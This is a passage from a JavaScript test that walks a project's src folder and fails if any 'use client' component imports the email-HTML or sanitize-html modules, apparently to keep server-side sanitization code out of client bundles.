        const full = path.join(dir, entry.name)
        if (entry.isDirectory()) { walk(full); continue }
        if (!/\.(js|jsx)$/.test(entry.name) || /\.test\./.test(entry.name)) continue
        const source = readFileSync(full, 'utf8')
        if (!/^\s*['"]use client['"]/.test(source)) continue
        if (/from\s+['"](@\/lib\/email-html|sanitize-html)['"]/.test(source)) offenders.push(full)
      }
    }
    walk(path.join(process.cwd(), 'src'))
    expect(offenders).toEqual([])
  })
})
